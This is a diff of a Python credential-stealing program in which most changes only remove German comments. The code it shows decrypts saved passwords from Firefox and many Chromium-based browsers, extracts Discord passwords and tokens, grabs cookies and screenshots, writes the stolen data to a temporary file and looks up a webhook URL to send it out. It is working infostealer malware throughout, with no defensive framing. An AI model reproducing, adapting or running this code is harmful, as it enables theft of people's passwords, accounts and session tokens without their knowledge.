@@ -185,7 +185,6 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
         try:
             logins_path = os.path.join(profile_path, 'logins.json')
             if not os.path.exists(logins_path):
-                # Versuche alternative Dateinamen
                 alt_paths = [
                     os.path.join(profile_path, 'signons.sqlite'),
                     os.path.join(profile_path, 'signons.json'),
@@ -199,9 +198,7 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
                 else:
                     return []
                 
-            # Behandle verschiedene Datei-Formate
             if logins_path.endswith('.json'):
-                # Lade die Logindaten
                 with open(logins_path, 'r', encoding='utf-8') as f:
                     try:
                         logins_data = json.load(f)
@@ -209,7 +206,6 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
                         print(f"Invalid JSON in {logins_path}")
                         return []
                         
-                # Extrahiere die Passwörter
                 success_count = 0
                 failed_count = 0
                 
@@ -224,7 +220,6 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
                         username = ""
                         password = ""
                         
-                        # Entschlüssle Benutzername
                         input_item = SECItem()
                         input_item.data = cast(create_string_buffer(username_enc), c_void_p)
                         input_item.len = len(username_enc)
@@ -236,7 +231,7 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
                         if nss.PK11SDR_Decrypt(byref(input_item), byref(output_item), None) == 0:
                             username = string_at(output_item.data, output_item.len).decode()
                             
-                        # Entschlüssle Passwort
+
                         input_item = SECItem()
                         input_item.data = cast(create_string_buffer(password_enc), c_void_p)
                         input_item.len = len(password_enc)
@@ -248,7 +243,6 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
                         if nss.PK11SDR_Decrypt(byref(input_item), byref(output_item), None) == 0:
                             password = string_at(output_item.data, output_item.len).decode()
                             
-                        # Füge Passwort zur Liste hinzu
                         if username and password:
                             success_count += 1
                             host = login.get('hostname', '')
@@ -259,7 +253,6 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
                             })
                         else:
                             failed_count += 1
-                            # Versuche alternative Dekodierung für teilweise Informationen
                             host = login.get('hostname', '')
                             if host and username:
                                 passwords.append({
@@ -275,21 +268,16 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
                     print(f"Successfully decrypted {success_count} Firefox passwords ({failed_count} failed)")
             
             elif logins_path.endswith('.sqlite'):
-                # Implementiere SQLite-basierte Passwortextraktion für ältere Firefox-Versionen
-                # Dies erfordert eine andere Vorgehensweise und wird hier vereinfacht
                 try:
-                    # Erstelle eine temporäre Kopie der Datenbank, um Sperren zu vermeiden
                     temp_db = os.path.join(os.getenv("TEMP"), f"firefox_logins_{os.path.basename(profile_path)}.db")
                     if os.path.exists(temp_db):
                         os.remove(temp_db)
                         
                     shutil.copy2(logins_path, temp_db)
                     
-                    # Verbindung zur Datenbank herstellen
                     conn = sqlite3.connect(temp_db)
                     cursor = conn.cursor()
                     
-                    # Versuche verschiedene Tabellennamen und Spalten für unterschiedliche Firefox-Versionen
                     query_templates = [
                         "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins",
                         "SELECT hostname, formSubmitURL, httpRealm, usernameField, passwordField, encryptedUsername, encryptedPassword FROM moz_logins",
@@ -301,13 +289,9 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
                             cursor.execute(query)
                             login_data = cursor.fetchall()
                             
-                            # Je nach Abfrage unterschiedliche Verarbeitung
                             if "encryptedUsername" in query:
-                                # Verarbeite verschlüsselte Daten
-                                # Implementierung ähnlich wie für JSON-Datei
                                 pass
                             else:
-                                # Direkte Extraktion
                                 for row in login_data:
                                     if len(row) >= 3:
                                         url = row[0]
@@ -321,7 +305,7 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
                                                 'password': password
                                             })
                                             
-                            break  # Verwende die erste erfolgreiche Abfrage
+                            break  
                             
                         except sqlite3.OperationalError:
                             continue
@@ -338,7 +322,6 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
                     print(f"Error reading Firefox SQLite database: {str(e)}")
                     
         finally:
-            # Shutdown NSS
             nss.NSS_Shutdown()
             
         return passwords
@@ -350,7 +333,6 @@ def get_firefox_passwords():
     """Sammelt Passwörter aus Firefox und Firefox-basierten Browsern"""
     all_passwords = []
     
-    # Firefox-Installationsverzeichnisse
     firefox_installations = {
         "Firefox": os.path.join(os.getenv("PROGRAMFILES"), "Mozilla Firefox"),
         "Firefox (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Mozilla Firefox"),
@@ -360,7 +342,6 @@ def get_firefox_passwords():
         "Firefox Nightly (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Firefox Nightly")
     }
     
-    # Firefox Profilverzeichnisse
     profile_locations = {
         "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
         "Firefox Developer": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Developer Edition", "Profiles"),
@@ -373,7 +354,6 @@ def get_firefox_passwords():
         "LibreWolf": os.path.join(os.getenv("APPDATA"), "LibreWolf", "Profiles")
     }
     
-    # Finde eine gültige Firefox-Installation
     firefox_dir = None
     for name, path in firefox_installations.items():
         if os.path.exists(path) and os.path.exists(os.path.join(path, 'nss3.dll')):
@@ -381,22 +361,18 @@ def get_firefox_passwords():
             break
             
     if not firefox_dir:
-        return []  # Keine Firefox-Installation gefunden
+        return [] 
         
-    # Sammle Passwörter aus allen Profilen aller unterstützten Browser
     for browser_name, profile_location in profile_locations.items():
         if not os.path.exists(profile_location):
             continue
             
-        # Finde alle Profile für diesen Browser
         profiles = get_firefox_profiles(profile_location)
         
         for profile_path in profiles:
             try:
-                # Entschlüssle Passwörter aus diesem Profil
                 profile_passwords = decrypt_firefox_passwords(firefox_dir, profile_path)
                 
-                # Füge Browser-Informationen hinzu
                 for pwd in profile_passwords:
                     pwd['browser'] = browser_name
                     
@@ -463,7 +439,6 @@ def get_system_info():
             "battery": "N/A"
         }
         
-        # Battery info (if available)
         if hasattr(psutil, "sensors_battery") and psutil.sensors_battery():
             battery = psutil.sensors_battery()
             sys_info["battery"] = f"{battery.percent}% {'(Charging)' if battery.power_plugged else '(Discharging)'}"
@@ -475,44 +450,36 @@ def get_system_info():
 def get_installed_browsers():
     browsers = []
     browser_paths = {
-        # Chrome und Chrome-basierte Browser
         "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome"),
         "Chrome Beta": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Beta"),
         "Chrome Dev": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Dev"),
         "Chrome SxS": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS"),
         
-        # Microsoft Edge und Versionen
         "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge"),
         "Edge Beta": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta"),
         "Edge Dev": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev"),
         "Edge Canary": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Canary"),
         
-        # Brave Browser
         "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser"),
         "Brave Beta": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Beta"),
         "Brave Nightly": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Nightly"),
         
-        # Opera Familie
         "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
         "Opera GX": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
         "Opera Neon": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Neon"),
         "Opera Beta": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Beta"),
         "Opera Developer": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Developer"),
         
-        # Vivaldi
         "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi"),
         "Vivaldi Snapshot": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi Snapshot"),
         
-        # Firefox
         "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox"),
         "Firefox Developer": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Developer Edition"),
         "Firefox Nightly": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Nightly"),
         "Seamonkey": os.path.join(os.getenv("APPDATA"), "Mozilla", "SeaMonkey", "Profiles"),
         
-        # Yandex
         "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser"),
         
-        # Andere Chromium-basierte Browser
         "Chromium": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium"),
         "Comodo Dragon": os.path.join(os.getenv("LOCALAPPDATA"), "Comodo", "Dragon"),
         "Epic Privacy Browser": os.path.join(os.getenv("LOCALAPPDATA"), "Epic Privacy Browser"),
@@ -544,11 +511,9 @@ def get_installed_browsers():
 
 def decrypt_password(password, key):
     try:
-        # Prüfe auf gültige Eingabedaten
         if not password or len(password) < 15:
             return "Failed to decrypt"
             
-        # Standard Chromium-Entschlüsselung
         try:
             iv = password[3:15]
             password = password[15:]
@@ -557,24 +522,19 @@ def decrypt_password(password, key):
             if decrypted_pass:
                 return decrypted_pass
         except Exception as e:
-            # Bei Fehler, versuche alternative Methode
             pass
             
-        # Alternativer Ansatz mit CryptUnprotectData
         try:
             result = CryptUnprotectData(password, None, None, None, 0)
             if result and result[1]:
                 return result[1].decode() if isinstance(result[1], bytes) else str(result[1])
         except Exception as e:
-            # Wenn beide Methoden fehlschlagen, versuche DPAPI direkt
             pass
             
-        # Letzte Ressource: rohe Daten extrahieren
         try:
             if isinstance(password, bytes) and len(password) > 20:
-                # Versuche alle lesbaren Zeichen zu extrahieren
                 printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
-                if len(printable_chars) > 4:  # Mindestlänge für ein sinnvolles Passwort
+                if len(printable_chars) > 4:
                     return f"Partially recovered: {printable_chars}"
         except:
             pass
@@ -585,9 +545,7 @@ def decrypt_password(password, key):
 
 def get_browser_passwords():
     passwords = []
-    # Erweiterte Browser-Liste mit verschiedenen Profilen und alternativen Pfaden
     browser_data = {
-        # Chrome und Chrome-basierte Browser
         "Chrome": {
             "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
             "login_db": "\\Default\\Login Data"
@@ -617,7 +575,6 @@ def get_browser_passwords():
             "login_db": "\\Default\\Login Data"
         },
         
-        # Microsoft Edge und Profile
         "Edge": {
             "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
             "login_db": "\\Default\\Login Data"
@@ -643,7 +600,6 @@ def get_browser_passwords():
             "login_db": "\\Default\\Login Data"
         },
         
-        # Brave Browser und Profile
         "Brave": {
             "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
             "login_db": "\\Default\\Login Data"
@@ -665,7 +621,6 @@ def get_browser_passwords():
             "login_db": "\\Default\\Login Data"
         },
         
-        # Opera Familie
         "Opera": {
             "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
             "login_db": "\\Login Data"
@@ -687,7 +642,6 @@ def get_browser_passwords():
             "login_db": "\\Login Data"
         },
         
-        # Vivaldi
         "Vivaldi": {
             "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
             "login_db": "\\Default\\Login Data"
@@ -711,7 +665,6 @@ def get_browser_passwords():
             "login_db": "\\Profile 1\\Login Data"
         },
         
-        # Andere Chromium-basierte Browser
         "Chromium": {
             "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data"),
             "login_db": "\\Default\\Login Data"
@@ -798,11 +751,10 @@ def get_browser_passwords():
         },
         "Seamonkey": {
             "profile_path": os.path.join(os.getenv("APPDATA"), "Mozilla", "SeaMonkey", "Profiles"),
-            "login_db": "\\signons.sqlite" # Mozilla-basiert, anderes Format
+            "login_db": "\\signons.sqlite"
         }
     }
     
-    # Automatisch weitere Chrome-Profile scannen (bis zu 10)
     for i in range(4, 10):
         browser_data[f"Chrome Profile {i}"] = {
             "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
@@ -814,21 +766,16 @@ def get_browser_passwords():
             profile_path = data["profile_path"]
             login_db = data["login_db"]
             
-            # Prüfen, ob der Pfad existiert
             if not os.path.exists(profile_path):
                 continue
                 
-            # Spezialfall für Firefox/Seamonkey-basierte Browser (SQLite3 Format unterscheidet sich)
             if "signons.sqlite" in login_db:
-                # Firefox-Passwörter erfordern ein anderes Verfahren, Implementierung überspringen
                 continue
                 
-            # Für Chromium-basierte Browser
             full_login_db_path = os.path.join(profile_path + login_db)
             if not os.path.exists(full_login_db_path):
                 continue
                 
-            # Versuchen, den Master Key zu bekommen
             state_file = os.path.join(profile_path, "Local State")
             if not os.path.exists(state_file):
                 continue
@@ -837,24 +784,19 @@ def get_browser_passwords():
                 local_state = json.loads(f.read())
                 master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
             
-            # Master Key entschlüsseln
             master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
             
-            # Kopiere die Login Data Datei in einen temporären Ort
             temp_db = os.path.join(os.getenv("TEMP"), f"{browser.replace(' ', '_')}_login_data.db")
             if os.path.exists(temp_db):
                 os.remove(temp_db)
             
-            # Kopieren, um Datenbank-Lock zu vermeiden
             with open(full_login_db_path, "rb") as login_data_file:
                 with open(temp_db, "wb") as temp_file:
                     temp_file.write(login_data_file.read())
             
-            # Verbindung zur Datenbank herstellen
             conn = sqlite3.connect(temp_db)
             cursor = conn.cursor()
             
-            # Abfrage für Passwörter
             try:
                 cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                 login_data = cursor.fetchall()
@@ -866,11 +808,9 @@ def get_browser_passwords():
                     if not url or not username or not password:
                         continue
                     
-                    # Passwort entschlüsseln
                     try:
                         decrypted_password = decrypt_password(password, master_key)
                         
-                        # Zur Passwortliste hinzufügen
                         if url and username and decrypted_password:
                             if decrypted_password != "Failed to decrypt":
                                 success_count += 1
@@ -904,7 +844,6 @@ def get_browser_passwords():
             cursor.close()
             conn.close()
             
-            # Temporäre Datei entfernen
             try:
                 os.remove(temp_db)
             except:
@@ -913,7 +852,6 @@ def get_browser_passwords():
         except Exception as e:
             print(f"Error processing {browser}: {str(e)}")
     
-    # Versuche auch Firefox-Passwörter zu bekommen
     if FIREFOX_SUPPORTED:
         firefox_passwords = get_firefox_passwords()
         passwords.extend(firefox_passwords)
@@ -926,17 +864,14 @@ def take_screenshot():
     
     screenshots = []
     try:
-        # Get the number of monitors
         monitors = PIL.ImageGrab.getdisplays() if hasattr(PIL.ImageGrab, 'getdisplays') else [0]
         
         for i, monitor in enumerate(monitors):
-            # Take screenshot
             if hasattr(PIL.ImageGrab, 'grab') and len(monitors) > 1:
                 screenshot = PIL.ImageGrab.grab(all_screens=True) if i == 0 else PIL.ImageGrab.grab(device=monitor)
             else:
                 screenshot = PIL.ImageGrab.grab()
             
-            # Resize to reduce file size
             max_width = 1280
             if screenshot.width > max_width:
                 ratio = max_width / screenshot.width
@@ -957,7 +892,6 @@ def take_screenshot():
     return screenshots
 
 def get_webhook_url():
-    # Versuchen die Webhook-URL aus der Konfigurationsdatei zu lesen
     storage_path = os.path.join(os.getenv('APPDATA'), 'gruppe_storage')
     config_path = os.path.join(storage_path, 'config.json')
     
@@ -995,7 +929,6 @@ def get_discord_password():
         login_data_path = os.path.join(path, "Login Data")
         if os.path.exists(login_data_path):
             try:
-                # Kopiere die Datei, um Datenbanksperre zu vermeiden
                 temp_path = os.path.join(os.getenv("TEMP"), f"discord_login_{platform.replace(' ', '_')}.db")
                 if os.path.exists(temp_path):
                     os.remove(temp_path)
@@ -1006,7 +939,6 @@ def get_discord_password():
                 cursor = conn.cursor()
                 
                 try:
-                    # Versuche verschiedene Tabellen/Spalten
                     queries = [
                         "SELECT origin_url, username_value, password_value FROM logins",
                         "SELECT origin_url, username_element, password_element, username_value, password_value FROM logins",
@@ -1023,7 +955,6 @@ def get_discord_password():
                                     password = row[2] if len(row) == 3 else row[4]
                                     
                                     if "discord" in url.lower() and username and password:
-                                        # State file zum Entschlüsseln
                                         state_path = os.path.join(path, "Local State")
                                         if os.path.exists(state_path):
                                             with open(state_path, 'r', encoding='utf-8') as f:
@@ -1375,8 +1306,6 @@ def get_token():
             except Exception as e:
                 print(f"Error decrypting token: {str(e)}")
                 continue
-    
-    # Get webhook URL
     webhook_url = get_webhook_url()
     if not webhook_url:
         return False
@@ -1407,20 +1336,16 @@ def get_token():
                 cookies_domain = get_cookies({browser_name: path}, domain)
                 cookies_to_grab.extend(cookies_domain)
     
-    # Erstelle eine Liste aller gefundenen Token (auch wenn keine Benutzerinformationen gefunden wurden)
     all_tokens = []
     
-    # Füge alle Token aus der Benutzerdatenliste hinzu
     for user_data in user_tokens:
         if user_data.get("token") and user_data["token"] not in all_tokens:
             all_tokens.append(user_data["token"])
     
-    # Füge alle Rohtoken hinzu, die wir gefunden haben
     for token in checker:
         if token and token not in all_tokens:
             all_tokens.append(token)
     
-    # Create password text file
     if browser_passwords:
         try:
             temp_file = os.path.join(os.getenv("TEMP"), "passwords.txt")
@@ -1539,7 +1464,6 @@ def get_token():
         except Exception as e:
             print(f"Error creating password file: {str(e)}")
     
-    # Basic embed für den Fall, dass keine Tokens gefunden wurden
     if not user_tokens:
         try:
             token_text = "```No Discord tokens found```"
@@ -1669,11 +1593,9 @@ def get_token():
         
         return True
     
-    # Send token information if we found any
     for user_data in user_tokens:
         token_section = f"```{user_data['token']}```"
         
-        # Füge zusätzliche Tokens hinzu, die nicht zu einem Benutzer gehören
         additional_tokens = [token for token in all_tokens if token != user_data['token']]
         if additional_tokens:
             token_section = "```\n"
